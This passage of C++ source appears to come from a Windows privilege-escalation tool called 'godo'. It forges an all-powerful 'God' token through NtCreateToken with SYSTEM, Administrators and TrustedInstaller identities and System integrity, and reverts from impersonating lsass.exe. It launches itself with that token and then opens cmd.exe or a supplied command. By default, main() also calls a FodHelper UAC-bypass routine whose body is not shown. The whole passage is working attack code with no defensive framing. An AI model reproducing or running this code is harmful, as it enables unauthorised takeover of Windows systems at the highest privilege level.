			return INVALID_HANDLE_VALUE;
		}

		// Prepare token user for call to NtCreateToken
		TOKEN_USER tokenUser = { };
		tokenUser.User.Sid = systemUserSid;
		tokenUser.User.Attributes = 0;

		// Prepare token groups for call to NtCreateToken
		constexpr DWORD tokenGroupsGroupCount = 5;
		PTOKEN_GROUPS tokenGroups = reinterpret_cast<PTOKEN_GROUPS>(LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + ((tokenGroupsGroupCount - 1) * sizeof(SID_AND_ATTRIBUTES))));
		tokenGroups->GroupCount = tokenGroupsGroupCount;
		tokenGroups->Groups[0].Sid = administratorsGroupSid;
		tokenGroups->Groups[0].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY | SE_GROUP_OWNER;
		tokenGroups->Groups[1].Sid = authenticatedUsersGroupSid;
		tokenGroups->Groups[1].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
		tokenGroups->Groups[2].Sid = everyoneGroupSid;
		tokenGroups->Groups[2].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
		tokenGroups->Groups[3].Sid = systemIntegrityLevelSid;
		tokenGroups->Groups[3].Attributes = SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED | SE_GROUP_MANDATORY;
		tokenGroups->Groups[4].Sid = trustedInstallerUserSid;
		tokenGroups->Groups[4].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;

		// Prepare token owner for call to NtCreateToken
		TOKEN_OWNER tokenOwner = { };
		tokenOwner.Owner = administratorsGroupSid;

		// Prepare token primary group for call to NtCreateToken
		TOKEN_PRIMARY_GROUP tokenPrimaryGroup = { };
		tokenPrimaryGroup.PrimaryGroup = administratorsGroupSid;

		// Call NTCreateToken
		if (FAILED(NtCreateToken(&godToken, desiredAccess, &objectAttributes, tokenType, &authenticationID, &expirationTime, &tokenUser, tokenGroups, tokenPrivileges, &tokenOwner, &tokenPrimaryGroup, &tokenDefaultDacl, &tokenSource))) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: The call to NtCreateToken failed." << std::endl;
			LocalFree(tokenPrivileges);
			LocalFree(systemUserSid);
			LocalFree(administratorsGroupSid);
			LocalFree(authenticatedUsersGroupSid);
			LocalFree(everyoneGroupSid);
			LocalFree(systemIntegrityLevelSid);
			LocalFree(trustedInstallerUserSid);
			LocalFree(tokenGroups);
			return INVALID_HANDLE_VALUE;
		}

		// Cleanup after call to NtCreateToken
		LocalFree(tokenPrivileges);
		LocalFree(systemUserSid);
		LocalFree(administratorsGroupSid);
		LocalFree(authenticatedUsersGroupSid);
		LocalFree(everyoneGroupSid);
		LocalFree(systemIntegrityLevelSid);
		LocalFree(trustedInstallerUserSid);
		LocalFree(tokenGroups);
	}

	// Set the God token to the current active session id
	{
		DWORD activeConsoleSessionId = WTSGetActiveConsoleSessionId();
		if (activeConsoleSessionId == 0xFFFFFFFF) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to get active console session id." << std::endl;
			CloseHandle(godToken);
			return INVALID_HANDLE_VALUE;
		}
		if (!SetTokenInformation(godToken, TokenSessionId, &activeConsoleSessionId, sizeof(DWORD))) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to set console session id." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
	}

	// Give the God token UI access
	{
		BOOL uiAccess = TRUE;
		if (!SetTokenInformation(godToken, TokenUIAccess, &uiAccess, sizeof(BOOL))) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to set ui access." << std::endl;
			CloseHandle(godToken);
			return INVALID_HANDLE_VALUE;
		}
	}

	// Stop impersonating lsass.exe
	{
		if (!SetThreadToken(NULL, NULL)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to revert to normal token." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
		if (!RevertToSelf()) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to revert to normal token." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
	}

	return godToken;
}

BOOL LaunchWithToken(int argc, char** argv, HANDLE token) {
	// Get command line
	std::wostringstream commandLineStream = { };
	for (int i = 0; i < argc; i++) {
		if (i >= 1) {
			commandLineStream << L" ";
		}
		commandLineStream << L"\"" << argv[i] << L"\"";
	}
	std::wstring commandLineString = commandLineStream.str();
	LPWSTR commandLine = new WCHAR[commandLineString.size() + 1];
	memcpy(commandLine, commandLineString.c_str(), commandLineString.size() * sizeof(WCHAR));
	commandLine[commandLineString.size()] = '\0';

	STARTUPINFOW si = { };
	si.cb = sizeof(STARTUPINFOW);
	GetStartupInfoW(&si);

	// Call CreateProcessWithTokenW to create the new process with the God token
	PROCESS_INFORMATION pi = { };
	if (!CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, NULL, commandLine, 0, NULL, NULL, &si, &pi)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: The call to CreateProcessWithTokenW failed." << std::endl;
		delete[] commandLine;
		return FALSE;
	}

	// Cleanup after call to CreateProcessWithTokenW
	delete[] commandLine;
	if (!CloseHandle(pi.hThread)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to close handle to thread of child process." << std::endl;
		CloseHandle(pi.hProcess);
		return FALSE;
	}
	if (!CloseHandle(pi.hProcess)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to close handle to child process." << std::endl;
		return FALSE;
	}

	return TRUE;
}

#define pauseAtExit (FALSE)
#define bypassUAC (TRUE)
int main(int argc, char** argv) {
	int returnCode = (int)-1;
	{
		std::wcout << L"Hello from godo process with PID " << GetCurrentProcessId() << std::endl;

		if (!EnableAllPrivileges()) {
			std::cout.flush();
			std::wcout.flush();
			std::cerr.flush();
			std::wcerr.flush();
			returnCode = 1; goto godoExit;
		}
		std::wcout << L"Enabled all privileges" << std::endl;

		if (!IsElevated()) {
			if (bypassUAC) {
				std::wcout << L"Not elevated. Launching admin child with FodHelper..." << std::endl;
				if (!ElevateViaFodhelper(argc, argv)) {
					std::cout.flush();
					std::wcout.flush();
					std::cerr.flush();
					std::wcerr.flush();
					returnCode = 1; goto godoExit;
				}
				std::wcout << L"Launched admin child with FodHelper" << std::endl;
			}
			else {
				std::wcout << L"Not elevated. Launching admin child with UAC..." << std::endl;
				if (!ElevateViaUAC(argc, argv)) {
					std::cout.flush();
					std::wcout.flush();
					std::cerr.flush();
					std::wcerr.flush();
					returnCode = 1; goto godoExit;
				}
				std::wcout << L"Launched admin child with UAC" << std::endl;
			}
			returnCode = 0; goto godoExit;
		}

		if (!IsGod()) {
			std::wcout << L"Not god. Launching god child with token..." << std::endl;

			HANDLE godToken = CreateGodToken();
			if (godToken == INVALID_HANDLE_VALUE) {
				std::cout.flush();
				std::wcout.flush();
				std::cerr.flush();
				std::wcerr.flush();
				returnCode = 1; goto godoExit;
			}
			std::wcout << L"Created god token" << std::endl;

			if (!LaunchWithToken(argc, argv, godToken)) {
				std::cout.flush();
				std::wcout.flush();
				std::cerr.flush();
				std::wcerr.flush();
				returnCode = 1; goto godoExit;
			}
			std::wcout << L"Launched god child with token" << std::endl;
			returnCode = 0; goto godoExit;
		}

		std::wcout << L"Launching final shell command" << std::endl;
		// Get command line minus the process name
		std::wostringstream commandLineStream = { };
		if (argc > 1) {
			for (int i = 1; i < argc; i++) {
				if (i >= 2) {
					commandLineStream << L" ";
				}
				commandLineStream << L"\"" << argv[i] << L"\"";
			}
		}
		else {
			commandLineStream << L"\"C:\\Windows\\System32\\cmd.exe\"";
		}
		std::wstring commandLineString = commandLineStream.str();
		LPWSTR commandLine = new WCHAR[commandLineString.size() + 1];
		memcpy(commandLine, commandLineString.c_str(), commandLineString.size() * sizeof(WCHAR));
		commandLine[commandLineString.size()] = '\0';

		STARTUPINFOW si = { };
		si.cb = sizeof(STARTUPINFOW);
		GetStartupInfoW(&si);

		// Call CreateProcessW
		PROCESS_INFORMATION pi = { };
		if (!CreateProcessW(NULL, commandLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: The call to CreateProcessW failed." << std::endl;
			delete[] commandLine;
			std::cout.flush();
			std::wcout.flush();
			std::cerr.flush();
			std::wcerr.flush();
			returnCode = 1; goto godoExit;
		}
		delete[] commandLine;

		// Cleanup after call to CreateProcessW
		if (!CloseHandle(pi.hThread)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to close handle to thread of child process." << std::endl;
			CloseHandle(pi.hProcess);
			std::cout.flush();
			std::wcout.flush();
			std::cerr.flush();
			std::wcerr.flush();
			returnCode = 1; goto godoExit;
		}
		if (!CloseHandle(pi.hProcess)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to close handle to child process." << std::endl;
			std::cout.flush();
			std::wcout.flush();
			std::cerr.flush();
			std::wcerr.flush();
			returnCode = 1; goto godoExit;
		}

		std::cout.flush();
		std::wcout.flush();
		std::cerr.flush();
		std::wcerr.flush();
		returnCode = 1; goto godoExit;
	}
godoExit:
	if (pauseAtExit) {
		while (TRUE) {}
	}
	return returnCode;
}
